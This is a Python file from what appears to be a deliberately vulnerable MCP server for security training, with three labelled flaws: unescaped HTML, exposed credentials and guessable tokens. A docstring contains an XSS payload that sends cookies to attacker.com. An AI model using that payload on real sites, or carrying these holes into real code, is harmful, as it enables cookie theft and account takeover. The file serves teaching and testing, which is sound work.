"""
Miscellaneous vulnerabilities:
  greet_user — Reflected Content / XSS-equivalent (CWE-79)
  get_config  — Sensitive Data Exposure (CWE-200)
  check_auth  — Weak Authentication (CWE-287)
"""

_VALID_TOKENS = {"secret123", "admin", "letmein", "password"}


def greet_user(name: str) -> str:
    """Return a personalised HTML greeting.

    VULNERABLE: user input embedded in HTML without escaping (CWE-79).
    The MCP layer returns plain text, but the unescaped HTML string matters
    if the output is rendered in a browser or rich client.

    XSS payload:
        <script>alert(document.cookie)</script>

    HTML injection:
        <img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
    """
    return f"<html><body><h1>Hello, {name}!</h1></body></html>"


def get_config() -> str:
    """Return the application configuration, including all credentials.

    VULNERABLE: sensitive data returned to any caller without authentication (CWE-200).
    """
    lines = [
        "database_url:      sqlite:////app/data/users.db",
        "aws_access_key:    AKIAIOSFODNN7EXAMPLE",
        "aws_secret_key:    wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "jwt_secret:        my_jwt_signing_secret",
        "admin_password:    Sup3rS3cr3t!",
        "internal_endpoint: http://internal-api.evmcp.local:9000",
        "smtp_password:     smtp_p@ssw0rd",
        "debug_mode:        true",
        "allowed_hosts:     *",
    ]
    return "\n".join(lines)


def check_auth(token: str) -> str:
    """Validate a bearer token and return the caller's privilege level.

    VULNERABLE: accepts trivially guessable tokens (CWE-287).
    The MCP endpoint itself has no authentication — this tool demonstrates
    weak token validation logic in isolation.

    Valid tokens: secret123 / admin / letmein / password
    """
    if token in _VALID_TOKENS:
        role = "admin" if token == "admin" else "user"
        return f"Authenticated. Role: {role}. Token accepted."
    return f"Authentication failed. Token {token!r} is not recognised."
